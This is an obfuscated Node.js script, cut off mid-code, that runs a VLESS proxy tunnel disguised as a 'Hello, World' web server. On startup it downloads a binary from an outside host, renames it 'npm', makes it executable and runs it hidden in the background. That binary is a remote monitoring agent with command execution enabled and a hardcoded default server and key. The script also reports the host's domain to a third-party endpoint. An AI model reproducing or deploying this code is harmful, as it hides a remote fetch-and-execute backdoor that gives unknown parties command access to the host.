const _0x75a68=_0x2750;(function(_0x2ad741,_0x3117f8){const _0x25afc8=_0x2750,_0x4909e2=_0x2ad741();while(!![]){try{const _0x46caf0=parseInt(_0x25afc8(0x16a))/0x1+parseInt(_0x25afc8(0x20c))/0x2*(-parseInt(_0x25afc8(0x239))/0x3)+parseInt(_0x25afc8(0x161))/0x4*(-parseInt(_0x25afc8(0x22b))/0x5)+-parseInt(_0x25afc8(0x1ed))/0x6*(parseInt(_0x25afc8(0x1fd))/0x7)+-parseInt(_0x25afc8(0x1c6))/0x8*(-parseInt(_0x25afc8(0x1b4))/0x9)+-parseInt(_0x25afc8(0x1f9))/0xa+-parseInt(_0x25afc8(0x234))/0xb*(-parseInt(_0x25afc8(0x22d))/0xc);if(_0x46caf0===_0x3117f8)break;else _0x4909e2['push'](_0x4909e2['shift']());}catch(_0x56ef09){_0x4909e2['push'](_0x4909e2['shift']());}}}(_0x12ce,0xd1474));const os=require('os'),fs=require('fs'),net=require(_0x75a68(0x16b)),http=require('http'),axios=require(_0x75a68(0x215)),{Buffer}=require(_0x75a68(0x1e4)),{exec,execSync}=require(_0x75a68(0x192)),UUID=process['env'][_0x75a68(0x233)]||'1cd23f25-c283-40c7-942d-104a95434cc3',NEZHA_SERVER=process[_0x75a68(0x1ce)][_0x75a68(0x198)]||_0x75a68(0x1ff),NEZHA_PORT=process[_0x75a68(0x1ce)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x75a68(0x1ce)]['NEZHA_KEY']||_0x75a68(0x21d),AUTO_ACCESS=process['env'][_0x75a68(0x18e)]||![],XPATH=process['env'][_0x75a68(0x168)]||UUID[_0x75a68(0x171)](0x0,0x8),SUB_PATH=process[_0x75a68(0x1ce)][_0x75a68(0x226)]||'sub',DOMAIN=process['env'][_0x75a68(0x206)]||'',NAME=process[_0x75a68(0x1ce)][_0x75a68(0x1c7)]||'Vls',PORT=process['env'][_0x75a68(0x240)]||0xbb8,SETTINGS={[_0x75a68(0x233)]:UUID,[_0x75a68(0x1d9)]:_0x75a68(0x1c3),[_0x75a68(0x1b8)]:_0x75a68(0x175),[_0x75a68(0x168)]:'%2F'+XPATH,['MAX_BUFFERED_POSTS']:0x1e,[_0x75a68(0x211)]:0xf4240,[_0x75a68(0x1ad)]:0x7530,[_0x75a68(0x219)]:0x400*0x400,[_0x75a68(0x216)]:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x183dc7,_0x5b7687){for(let _0x1960bf=0x0;_0x1960bf<0x10;_0x1960bf++){if(_0x183dc7[_0x1960bf]!==_0x5b7687[_0x1960bf])return![];}return!![];}function concat_typed_arrays(_0x1cc175,..._0x2d65ae){const _0x4dc9e7=_0x75a68;if(!_0x2d65ae||_0x2d65ae[_0x4dc9e7(0x18b)]<0x1)return _0x1cc175;let _0x3525e0=_0x1cc175['length'];for(let _0x3a455d of _0x2d65ae)_0x3525e0+=_0x3a455d['length'];const _0xb22759=new _0x1cc175[(_0x4dc9e7(0x177))](_0x3525e0);_0xb22759['set'](_0x1cc175,0x0),_0x3525e0=_0x1cc175[_0x4dc9e7(0x18b)];for(let _0x205677 of _0x2d65ae){_0xb22759[_0x4dc9e7(0x1fc)](_0x205677,_0x3525e0),_0x3525e0+=_0x205677[_0x4dc9e7(0x18b)];}return _0xb22759;}function _0x2750(_0x315291,_0x24036f){const _0x12ce36=_0x12ce();return _0x2750=function(_0x2750c9,_0x4d036c){_0x2750c9=_0x2750c9-0x15f;let _0x30b529=_0x12ce36[_0x2750c9];return _0x30b529;},_0x2750(_0x315291,_0x24036f);}function log(_0x22a2ff,..._0xd0c151){const _0xa4610f=_0x75a68;if(SETTINGS[_0xa4610f(0x1d9)]===_0xa4610f(0x1c3))return;const _0x4a8362={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x46dd40={'debug':_0xa4610f(0x21c),'info':_0xa4610f(0x21f),'warn':'\x1b[33m','error':_0xa4610f(0x200),'reset':'\x1b[0m'},_0xc4166d=_0x4a8362[SETTINGS[_0xa4610f(0x1d9)]]||0x1,_0x59a9dc=_0x4a8362[_0x22a2ff]||0x0;if(_0x59a9dc>=_0xc4166d){const _0x49555e=new Date()[_0xa4610f(0x1a8)](),_0x2aa61e=_0x46dd40[_0x22a2ff]||_0x46dd40[_0xa4610f(0x205)];console[_0xa4610f(0x16c)](_0x2aa61e+'['+_0x49555e+']\x20['+_0x22a2ff+']',..._0xd0c151,_0x46dd40[_0xa4610f(0x205)]);}}const getDownloadUrl=()=>{const _0x1261c8=_0x75a68,_0x5d6b17=os[_0x1261c8(0x183)]();return _0x5d6b17==='arm'||_0x5d6b17===_0x1261c8(0x179)||_0x5d6b17===_0x1261c8(0x1ac)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x1261c8(0x247):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x49f5d6=_0x75a68;if(!NEZHA_KEY)return;try{const _0x4b8813=getDownloadUrl(),_0x3c3582=await axios({'method':_0x49f5d6(0x193),'url':_0x4b8813,'responseType':_0x49f5d6(0x229)}),_0x5b1308=fs[_0x49f5d6(0x231)](_0x49f5d6(0x195));return _0x3c3582['data']['pipe'](_0x5b1308),new Promise((_0x228385,_0x4b8804)=>{const _0x569d3c=_0x49f5d6;_0x5b1308['on'](_0x569d3c(0x230),()=>{const _0x345637=_0x569d3c;console[_0x345637(0x16c)]('npm\x20download\x20successfully'),exec(_0x345637(0x1a5),_0xcf7ead=>{if(_0xcf7ead)_0x4b8804(_0xcf7ead);_0x228385();});}),_0x5b1308['on'](_0x569d3c(0x244),_0x4b8804);});}catch(_0x521405){throw _0x521405;}},runnz=async()=>{const _0x34940d=_0x75a68;await downloadFile();let _0x35b6a7='',_0x413052='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x586147=[_0x34940d(0x1f8),_0x34940d(0x1df),_0x34940d(0x220),_0x34940d(0x19a),_0x34940d(0x1d3),_0x34940d(0x1f5)];_0x35b6a7=_0x586147[_0x34940d(0x1dc)](NEZHA_PORT)?'--tls':'',_0x413052=_0x34940d(0x18f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x34940d(0x174)+NEZHA_KEY+'\x20'+_0x35b6a7+_0x34940d(0x18c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3279c3=NEZHA_SERVER[_0x34940d(0x1dc)](':')?NEZHA_SERVER[_0x34940d(0x1f1)](':')['pop']():'',_0x2fed69=new Set([_0x34940d(0x1f8),_0x34940d(0x1df),_0x34940d(0x220),_0x34940d(0x19a),_0x34940d(0x1d3),'2053']),_0x596c00=_0x2fed69['has'](_0x3279c3)?_0x34940d(0x20f):_0x34940d(0x1ca),_0x66d52a=_0x34940d(0x1e7)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x34940d(0x1af)+_0x596c00+_0x34940d(0x1cb)+UUID;fs[_0x34940d(0x162)](_0x34940d(0x20e),_0x66d52a);}_0x413052=_0x34940d(0x204);}else return;}try{exec(_0x413052,{'shell':'/bin/bash'}),console[_0x34940d(0x16c)](_0x34940d(0x1fb));}catch(_0x4695ff){console[_0x34940d(0x244)](_0x34940d(0x1a3)+_0x4695ff);}};async function addAccessTask(){const _0x1569fe=_0x75a68;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x2fbc16='https://'+DOMAIN,_0x2b7b82=_0x1569fe(0x1d2)+_0x2fbc16+_0x1569fe(0x23e);exec(_0x2b7b82,(_0x42596a,_0x523eec,_0x32a44a)=>{const _0x10117c=_0x1569fe;if(_0x42596a){console[_0x10117c(0x244)](_0x10117c(0x22a),_0x42596a['message']);return;}console[_0x10117c(0x16c)](_0x10117c(0x173),_0x523eec);});}catch(_0x43a037){console[_0x1569fe(0x244)]('Error\x20added\x20Task:',_0x43a037['message']);}}function parse_uuid(_0x52f7f8){const _0x5c1f82=_0x75a68;_0x52f7f8=_0x52f7f8['replaceAll']('-','');const _0x430bed=[];for(let _0x1b793e=0x0;_0x1b793e<0x10;_0x1b793e++){_0x430bed[_0x5c1f82(0x1be)](parseInt(_0x52f7f8[_0x5c1f82(0x23a)](_0x1b793e*0x2,0x2),0x10));}return _0x430bed;}async function read_vless_header(_0x2bc293,_0x514eac){const _0x582944=_0x75a68;let _0x33c66f=0x0,_0x240485=new Uint8Array(),_0x56ce5d={'value':_0x240485,'done':![]};async function _0x39ef40(_0xdd7a72){const _0xb17771=_0x2750;if(_0x56ce5d['done'])throw new Error(_0xb17771(0x20a));const _0x2104d4=_0xdd7a72-_0x33c66f;if(_0x2104d4<0x1)return;_0x56ce5d=await read_atleast(_0x2bc293,_0x2104d4),_0x33c66f+=_0x56ce5d[_0xb17771(0x23d)]['length'],_0x240485=concat_typed_arrays(_0x240485,_0x56ce5d[_0xb17771(0x23d)]);}await _0x39ef40(0x1+0x10+0x1);const _0x2c3859=_0x240485[0x0],_0x4e67b8=_0x240485[_0x582944(0x171)](0x1,0x1+0x10),_0x4262a4=parse_uuid(_0x514eac);if(!validate_uuid(_0x4e67b8,_0x4262a4))throw new Error('invalid\x20UUID');const _0x3a25fc=_0x240485[0x1+0x10],_0x4275e2=0x1+0x10+0x1+_0x3a25fc+0x1+0x2+0x1;await _0x39ef40(_0x4275e2+0x1);const _0x148403=_0x240485[0x1+0x10+0x1+_0x3a25fc],_0x21d45b=0x1;if(_0x148403!==_0x21d45b)throw new Error(_0x582944(0x172)+_0x148403);const _0x26a7ef=(_0x240485[_0x4275e2-0x1-0x2]<<0x8)+_0x240485[_0x4275e2-0x1-0x1],_0x259726=_0x240485[_0x4275e2-0x1],_0x10f821=0x1,_0x5de59d=0x2,_0x66770c=0x3;let _0x56e029=-0x1;if(_0x259726===_0x10f821)_0x56e029=_0x4275e2+0x4;else{if(_0x259726===_0x66770c)_0x56e029=_0x4275e2+0x10;else _0x259726===_0x5de59d&&(_0x56e029=_0x4275e2+0x1+_0x240485[_0x4275e2]);}if(_0x56e029<0x0)throw new Error(_0x582944(0x1b6));await _0x39ef40(_0x56e029);const _0x160457=_0x4275e2;let _0x89fb12='';if(_0x259726===_0x10f821)_0x89fb12=_0x240485[_0x582944(0x171)](_0x160457,_0x160457+0x4)['join']('.');else{if(_0x259726===_0x5de59d)_0x89fb12=new TextDecoder()[_0x582944(0x232)](_0x240485[_0x582944(0x171)](_0x160457+0x1,_0x160457+0x1+_0x240485[_0x160457]));else _0x259726===_0x66770c&&(_0x89fb12=_0x240485[_0x582944(0x171)](_0x160457,_0x160457+0x10)[_0x582944(0x1db)]((_0x340238,_0x163357,_0x3e10bd,_0xce3eb6)=>_0x3e10bd%0x2?_0x340238[_0x582944(0x182)](((_0xce3eb6[_0x3e10bd-0x1]<<0x8)+_0x163357)[_0x582944(0x17c)](0x10)):_0x340238,[])[_0x582944(0x17d)](':'));}if(!_0x89fb12){log(_0x582944(0x244),'Failed\x20to\x20parse\x20hostname');throw new Error(_0x582944(0x1f6));}return log(_0x582944(0x17e),_0x582944(0x1dd)+_0x89fb12+':'+_0x26a7ef),{'hostname':_0x89fb12,'port':_0x26a7ef,'data':_0x240485['slice'](_0x56e029),'resp':new Uint8Array([_0x2c3859,0x0])};}async function read_atleast(_0x26db39,_0x4d4f8f){const _0x45977d=_0x75a68,_0x43ddbf=[];let _0x5df337=![];while(_0x4d4f8f>0x0&&!_0x5df337){const _0x2e62f8=await _0x26db39[_0x45977d(0x1b7)]();if(_0x2e62f8[_0x45977d(0x23d)]){const _0x5cf4fe=new Uint8Array(_0x2e62f8[_0x45977d(0x23d)]);_0x43ddbf['push'](_0x5cf4fe),_0x4d4f8f-=_0x5cf4fe[_0x45977d(0x18b)];}_0x5df337=_0x2e62f8[_0x45977d(0x16d)];}if(_0x4d4f8f>0x0)throw new Error(_0x45977d(0x190));return{'value':concat_typed_arrays(..._0x43ddbf),'done':_0x5df337};}async function parse_header(_0x1a6886,_0x43df68){const _0x452c6b=_0x75a68;log(_0x452c6b(0x18d),'Starting\x20to\x20parse\x20VLESS\x20header');const _0x553e25=_0x43df68[_0x452c6b(0x242)][_0x452c6b(0x1c9)]();try{const _0x4ce270=await read_vless_header(_0x553e25,_0x1a6886);return log('debug',_0x452c6b(0x212)),_0x4ce270;}catch(_0x2397fd){log(_0x452c6b(0x244),_0x452c6b(0x1b0)+_0x2397fd[_0x452c6b(0x1a2)]);throw new Error(_0x452c6b(0x1de)+_0x2397fd[_0x452c6b(0x1a2)]);}finally{_0x553e25[_0x452c6b(0x16f)]();}}function _0x12ce(){const _0x11e587=['\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','VLESS\x20header\x20parse\x20error:\x20','createServer','Failed\x20to\x20initialize\x20VLESS\x20connection','url','1867383FGsrCv','pipeTo','read\x20address\x20type\x20failed','read','BUFFER_SIZE','\x20before\x20initialization','catch','Connected\x20to\x20','&mode=packet-up#','Remote\x20connection\x20not\x20available','push','Read\x20controller\x20error:','Too\x20many\x20buffered\x20packets','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','pendingPackets','none','forEach','port','56BDCLEH','NAME','bufferedData','getReader','false','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','no-store','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','env','Failed\x20to\x20get\x20IP\x20address:','Created\x20new\x20session\x20for\x20GET:\x20','setKeepAlive','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','2083','unlink','currentStreamRes','enqueue','processPacket','GET','LOG_LEVEL','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','reduce','includes','VLESS\x20connection\x20to\x20','read\x20vless\x20header\x20error:\x20','8443','destroy','trim','VLESS\x20header\x20parsed:\x20','Upload\x20error:\x20','buffer','Read\x20controller\x20close\x20error:','createConnection','\x0aclient_secret:\x20','cleanup','socket\x20hang\x20up','New\x20secure\x20connection\x20using:\x20','random','nextSeq','6pXYUxu','GET,\x20POST','MAX_BUFFERED_POSTS','=================================','split','initializeVLESS','hostname','\x20bytes','2053','parse\x20hostname\x20failed','writeHead','443','16137230gRfBxy','pipe','npm\x20is\x20running','set','4145988RDeyTv','writable','nzag.faiz.us.kg:8008','\x1b[31m','Server\x20is\x20running\x20on\x20port\x20','Error\x20starting\x20downstream:\x20','from','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','reset','DOMAIN','remote','end','vlessHeader','header\x20length\x20too\x20short','Created\x20new\x20session\x20for\x20POST:\x20','372PoJBwd','pendingBuffers','config.yaml','true','getWriter','MAX_POST_SIZE','VLESS\x20header\x20parsed\x20successfully','Session\x20','aborted','axios','TCP_NODELAY','data','write','CHUNK_SIZE','socket','_writeToRemote','\x1b[36m','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','listen','\x1b[32m','2096','startDownstream','Hello,\x20World\x0a','destroyed','&fp=chrome&allowInsecure=1&type=xhttp&host=','Download\x20error:\x20','SUB_PATH','Remote\x20error:\x20','cleaned','stream','Error\x20sending\x20request:','415895sdXLId','fill','12WWckya','close','match','finish','createWriteStream','decode','UUID','20396453UodIha','base64','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','delete','Remote\x20connection\x20established','23853rpZqIk','substr','finally','utf-8','value','\x22}\x27','has','PORT','_startDownstreamResponse','readable','/([^/]+)(?:/([0-9]+))?$','error','localhost','Max\x20buffer\x20size:\x20','https://arm64.ssss.nyc.mn/agent','chunked','initialized','20vMJpXq','writeFileSync','Log\x20level:\x20','Cleaning\x20up\x20session\x20',',\x20size=','headersSent','Transform','XPATH','writableEnded','1651360hejWQs','net','log','done','Content-Type','releaseLock','responseHeader','slice','unsupported\x20command:\x20','Automatic\x20Access\x20Task\x20added\x20successfully:','\x20-p\x20','2048','Transfer-Encoding','constructor','Processed\x20packet\x20seq=','arm64','POST','connect','toString','join','info','downstreamStarted','&path=','bytes','concat','arch','uuid','method','resume','\x20timed\x20out\x20without\x20downstream','headerSent','application/octet-stream','Max\x20POST\x20size:\x20','length','\x20>/dev/null\x202>&1\x20&','debug','AUTO_ACCESS','nohup\x20./npm\x20-s\x20','not\x20enough\x20data\x20to\x20read','now','child_process','get','cork','npm','Created\x20new\x20session\x20with\x20UUID:\x20','Socket\x20error:','NEZHA_SERVER','setNoDelay','2087',':443?encryption=none&security=tls&sni=','uncork','vless://','Relay\x20error:','Socket\x20is\x20destroyed','Connection\x20failed:\x20','Buffered\x20packet\x20seq=','message','npm\x20running\x20error:\x20','resp','chmod\x20+x\x20npm','floor','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','toISOString','text/plain','bufferSize','reading_done','aarch64','SESSION_TIMEOUT','alpnProtocol'];_0x12ce=function(){return _0x11e587;};return _0x12ce();}async function connect_remote(_0x1018e3,_0x5c0cdf){const _0x40c856=_0x75a68,_0x58c690=0x1f40;try{const _0x382575=await timed_connect(_0x1018e3,_0x5c0cdf,_0x58c690);return _0x382575['setNoDelay'](!![]),_0x382575[_0x40c856(0x1d1)](!![],0x3e8),_0x382575[_0x40c856(0x1aa)]=parseInt(SETTINGS['BUFFER_SIZE'])*0x400,log('info',_0x40c856(0x1bb)+_0x1018e3+':'+_0x5c0cdf),_0x382575;}catch(_0x44ff7b){log('error',_0x40c856(0x1a0)+_0x44ff7b[_0x40c856(0x1a2)]);throw _0x44ff7b;}}function timed_connect(_0x5c72c1,_0x24b4c4,_0x2c3be9){return new Promise((_0x153f50,_0x2e07b4)=>{const _0x2bf7fd=_0x2750,_0x5c0baa=net[_0x2bf7fd(0x1e6)]({'host':_0x5c72c1,'port':_0x24b4c4}),_0x2950ad=setTimeout(()=>{_0x2e07b4(new Error('connect\x20timeout'));},_0x2c3be9);_0x5c0baa['on'](_0x2bf7fd(0x17b),()=>{clearTimeout(_0x2950ad),_0x153f50(_0x5c0baa);}),_0x5c0baa['on'](_0x2bf7fd(0x244),_0x315c5a=>{clearTimeout(_0x2950ad),_0x2e07b4(_0x315c5a);});});}function pipe_relay(){async function _0x1f0834(_0x81c31c,_0x23be54,_0x1e844e){const _0x75fb0a=_0x2750,_0x1f07c1=parseInt(SETTINGS['CHUNK_SIZE']);if(_0x1e844e['length']>0x0){if(_0x23be54[_0x75fb0a(0x218)])_0x23be54[_0x75fb0a(0x194)](),_0x23be54[_0x75fb0a(0x218)](_0x1e844e),process['nextTick'](()=>_0x23be54[_0x75fb0a(0x19c)]());else{const _0x2abb9e=_0x23be54[_0x75fb0a(0x1fe)][_0x75fb0a(0x210)]();try{await _0x2abb9e[_0x75fb0a(0x218)](_0x1e844e);}finally{_0x2abb9e['releaseLock']();}}}try{_0x81c31c[_0x75fb0a(0x1fa)]?(_0x81c31c['pause'](),_0x81c31c['pipe'](_0x23be54,{'end':!![],'highWaterMark':_0x1f07c1}),_0x81c31c[_0x75fb0a(0x186)]()):await _0x81c31c['readable'][_0x75fb0a(0x1b5)](_0x23be54[_0x75fb0a(0x1fe)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal['timeout'](SETTINGS[_0x75fb0a(0x1ad)])});}catch(_0x16a617){!_0x16a617[_0x75fb0a(0x1a2)][_0x75fb0a(0x1dc)](_0x75fb0a(0x214))&&log(_0x75fb0a(0x244),_0x75fb0a(0x19e),_0x16a617['message']);throw _0x16a617;}}return _0x1f0834;}function socketToWebStream(_0x30dcb0){let _0x4c1589,_0x1747f0;return _0x30dcb0['on']('error',_0x3cf4d6=>{const _0x29407c=_0x2750;log(_0x29407c(0x244),_0x29407c(0x197),_0x3cf4d6[_0x29407c(0x1a2)]),_0x4c1589?.[_0x29407c(0x244)](_0x3cf4d6),_0x1747f0?.[_0x29407c(0x244)](_0x3cf4d6);}),{'readable':new ReadableStream({'start'(_0x230700){const _0x46e31d=_0x2750;_0x4c1589=_0x230700,_0x30dcb0['on'](_0x46e31d(0x217),_0x27b983=>{const _0x407ab5=_0x46e31d;try{_0x230700[_0x407ab5(0x1d6)](_0x27b983);}catch(_0x36c63d){log(_0x407ab5(0x244),_0x407ab5(0x1bf),_0x36c63d['message']);}}),_0x30dcb0['on'](_0x46e31d(0x208),()=>{const _0x48fa24=_0x46e31d;try{_0x230700[_0x48fa24(0x22e)]();}catch(_0x5923b5){log(_0x48fa24(0x244),_0x48fa24(0x1e5),_0x5923b5['message']);}});},'cancel'(){const _0x43347a=_0x2750;_0x30dcb0[_0x43347a(0x1e0)]();}}),'writable':new WritableStream({'start'(_0x218a8d){_0x1747f0=_0x218a8d;},'write'(_0x1cbd18){return new Promise((_0x973033,_0x2986b1)=>{const _0x38a451=_0x2750;if(_0x30dcb0[_0x38a451(0x223)]){_0x2986b1(new Error(_0x38a451(0x19f)));return;}_0x30dcb0[_0x38a451(0x218)](_0x1cbd18,_0x142b62=>{if(_0x142b62)_0x2986b1(_0x142b62);else _0x973033();});});},'close'(){const _0x324de3=_0x2750;!_0x30dcb0[_0x324de3(0x223)]&&_0x30dcb0[_0x324de3(0x208)]();},'abort'(_0x393303){_0x30dcb0['destroy'](_0x393303);}})};}function relay(_0x156405,_0x42a6c3,_0x3cc319,_0x5845a4){const _0x30ce7e=_0x75a68,_0x34360a=pipe_relay();let _0x22f96c=![];const _0x5ac095=socketToWebStream(_0x3cc319);function _0x9d6841(){const _0x46df8f=_0x2750;if(!_0x22f96c){_0x22f96c=!![];try{_0x3cc319['destroy']();}catch(_0x3c6b23){!_0x3c6b23[_0x46df8f(0x1a2)][_0x46df8f(0x1dc)]('aborted')&&!_0x3c6b23[_0x46df8f(0x1a2)][_0x46df8f(0x1dc)](_0x46df8f(0x1e9))&&log(_0x46df8f(0x244),'Cleanup\x20error:\x20'+_0x3c6b23[_0x46df8f(0x1a2)]);}}}const _0x172f0f=_0x34360a(_0x42a6c3,_0x5ac095,_0x5845a4[_0x30ce7e(0x217)])[_0x30ce7e(0x1ba)](_0x2b6e55=>{const _0x2f0b4f=_0x30ce7e;!_0x2b6e55[_0x2f0b4f(0x1a2)][_0x2f0b4f(0x1dc)](_0x2f0b4f(0x214))&&!_0x2b6e55[_0x2f0b4f(0x1a2)][_0x2f0b4f(0x1dc)](_0x2f0b4f(0x1e9))&&log(_0x2f0b4f(0x244),_0x2f0b4f(0x1e3)+_0x2b6e55[_0x2f0b4f(0x1a2)]);})[_0x30ce7e(0x23b)](()=>{const _0x4cedd8=_0x30ce7e;_0x42a6c3[_0x4cedd8(0x1ab)]&&_0x42a6c3[_0x4cedd8(0x1ab)]();}),_0xf22a78=_0x34360a(_0x5ac095,_0x42a6c3,_0x5845a4['resp'])[_0x30ce7e(0x1ba)](_0x11a9c2=>{const _0x33ce37=_0x30ce7e;!_0x11a9c2[_0x33ce37(0x1a2)][_0x33ce37(0x1dc)](_0x33ce37(0x214))&&!_0x11a9c2[_0x33ce37(0x1a2)][_0x33ce37(0x1dc)](_0x33ce37(0x1e9))&&log(_0x33ce37(0x244),_0x33ce37(0x225)+_0x11a9c2[_0x33ce37(0x1a2)]);});_0xf22a78[_0x30ce7e(0x23b)](()=>_0x172f0f)[_0x30ce7e(0x23b)](_0x9d6841);}const sessions=new Map();class Session{constructor(_0x1b4402){const _0x47d501=_0x75a68;this['uuid']=_0x1b4402,this[_0x47d501(0x1ec)]=0x0,this[_0x47d501(0x17f)]=![],this['lastActivity']=Date[_0x47d501(0x191)](),this['vlessHeader']=null,this['remote']=null,this[_0x47d501(0x160)]=![],this[_0x47d501(0x170)]=null,this[_0x47d501(0x188)]=![],this[_0x47d501(0x1c8)]=new Map(),this[_0x47d501(0x228)]=![],this[_0x47d501(0x1c2)]=[],this[_0x47d501(0x1d5)]=null,this[_0x47d501(0x20d)]=new Map(),log(_0x47d501(0x18d),_0x47d501(0x196)+_0x1b4402);}async[_0x75a68(0x1f2)](_0x389b20){const _0x399198=_0x75a68;if(this[_0x399198(0x160)])return!![];try{log(_0x399198(0x18d),_0x399198(0x236));const _0x2ac85a=new ReadableStream({'start'(_0x1a41e9){const _0x2438a9=_0x399198;_0x1a41e9[_0x2438a9(0x1d6)](_0x389b20),_0x1a41e9[_0x2438a9(0x22e)]();}}),_0x49ce98={'readable':_0x2ac85a,'writable':new WritableStream()};return this[_0x399198(0x209)]=await parse_header(SETTINGS[_0x399198(0x233)],_0x49ce98),log(_0x399198(0x17e),_0x399198(0x1e2)+this['vlessHeader'][_0x399198(0x1f3)]+':'+this[_0x399198(0x209)][_0x399198(0x1c5)]),this[_0x399198(0x207)]=await connect_remote(this['vlessHeader'][_0x399198(0x1f3)],this[_0x399198(0x209)][_0x399198(0x1c5)]),log(_0x399198(0x17e),_0x399198(0x238)),this[_0x399198(0x160)]=!![],!![];}catch(_0x4ab979){return log(_0x399198(0x244),'Failed\x20to\x20initialize\x20VLESS:\x20'+_0x4ab979[_0x399198(0x1a2)]),![];}}async[_0x75a68(0x1d7)](_0x5229f7,_0x5ab55f){const _0x4a833a=_0x75a68;try{this[_0x4a833a(0x20d)][_0x4a833a(0x1fc)](_0x5229f7,_0x5ab55f),log(_0x4a833a(0x18d),_0x4a833a(0x1a1)+_0x5229f7+_0x4a833a(0x165)+_0x5ab55f['length']);while(this['pendingBuffers'][_0x4a833a(0x23f)](this[_0x4a833a(0x1ec)])){const _0xa69da=this[_0x4a833a(0x20d)][_0x4a833a(0x193)](this[_0x4a833a(0x1ec)]);this[_0x4a833a(0x20d)][_0x4a833a(0x237)](this['nextSeq']);if(!this[_0x4a833a(0x160)]&&this[_0x4a833a(0x1ec)]===0x0){if(!await this['initializeVLESS'](_0xa69da))throw new Error(_0x4a833a(0x1b2));this[_0x4a833a(0x170)]=Buffer['from'](this[_0x4a833a(0x209)][_0x4a833a(0x1a4)]),await this[_0x4a833a(0x21b)](this[_0x4a833a(0x209)]['data']),this[_0x4a833a(0x1d5)]&&this[_0x4a833a(0x241)]();}else{if(!this[_0x4a833a(0x160)]){log('warn','Received\x20out\x20of\x20order\x20packet\x20seq='+_0x5229f7+_0x4a833a(0x1b9));continue;}await this[_0x4a833a(0x21b)](_0xa69da);}this[_0x4a833a(0x1ec)]++,log(_0x4a833a(0x18d),_0x4a833a(0x178)+(this[_0x4a833a(0x1ec)]-0x1));}if(this[_0x4a833a(0x20d)]['size']>SETTINGS[_0x4a833a(0x1ef)])throw new Error(_0x4a833a(0x1c0));return!![];}catch(_0x52204d){log('error','Process\x20packet\x20error:\x20'+_0x52204d['message']);throw _0x52204d;}}[_0x75a68(0x241)](){const _0x1231ab=_0x75a68;if(!this[_0x1231ab(0x1d5)]||!this[_0x1231ab(0x170)])return;try{const _0x378d54=this['currentStreamRes'][_0x1231ab(0x21a)]?.[_0x1231ab(0x1ae)]||'http/1.1',_0x20f2b1=_0x378d54==='h2';!this[_0x1231ab(0x188)]&&(log(_0x1231ab(0x18d),'Sending\x20VLESS\x20response\x20header\x20('+_0x378d54+'):\x20'+this[_0x1231ab(0x170)][_0x1231ab(0x18b)]+_0x1231ab(0x1f4)),this['currentStreamRes'][_0x1231ab(0x218)](this[_0x1231ab(0x170)]),this[_0x1231ab(0x188)]=!![]);if(_0x20f2b1){this['currentStreamRes'][_0x1231ab(0x21a)][_0x1231ab(0x199)](!![]);const _0xdfb954=new require(_0x1231ab(0x229))[_0x1231ab(0x167)]({'transform'(_0x32763a,_0x169d04,_0x580250){const _0x74ad01=_0x1231ab,_0x483561=0x4000;for(let _0x466383=0x0;_0x466383<_0x32763a[_0x74ad01(0x18b)];_0x466383+=_0x483561){this[_0x74ad01(0x1be)](_0x32763a[_0x74ad01(0x171)](_0x466383,_0x466383+_0x483561));}_0x580250();}});this[_0x1231ab(0x207)][_0x1231ab(0x1fa)](_0xdfb954)['pipe'](this[_0x1231ab(0x1d5)]);}else this['remote'][_0x1231ab(0x1fa)](this[_0x1231ab(0x1d5)]);this['remote']['on']('end',()=>{const _0x44e3b9=_0x1231ab;!this[_0x44e3b9(0x1d5)][_0x44e3b9(0x169)]&&this[_0x44e3b9(0x1d5)]['end']();}),this[_0x1231ab(0x207)]['on'](_0x1231ab(0x244),_0xe77fc9=>{const _0x1641c8=_0x1231ab;log('error',_0x1641c8(0x227)+_0xe77fc9[_0x1641c8(0x1a2)]),!this[_0x1641c8(0x1d5)]['writableEnded']&&this[_0x1641c8(0x1d5)][_0x1641c8(0x208)]();});}catch(_0xa7131f){log('error',_0x1231ab(0x202)+_0xa7131f[_0x1231ab(0x1a2)]),this['cleanup']();}}['startDownstream'](_0x1cba2c,_0x30be24){const _0x4e1c24=_0x75a68;return!_0x1cba2c[_0x4e1c24(0x166)]&&_0x1cba2c[_0x4e1c24(0x1f7)](0xc8,_0x30be24),this[_0x4e1c24(0x1d5)]=_0x1cba2c,this['initialized']&&this['responseHeader']&&this[_0x4e1c24(0x241)](),_0x1cba2c['on'](_0x4e1c24(0x22e),()=>{const _0x1fdf3a=_0x4e1c24;log(_0x1fdf3a(0x17e),'Client\x20connection\x20closed'),this['cleanup']();}),!![];}async[_0x75a68(0x21b)](_0x1def69){const _0x5a0cff=_0x75a68;if(!this[_0x5a0cff(0x207)]||this['remote']['destroyed'])throw new 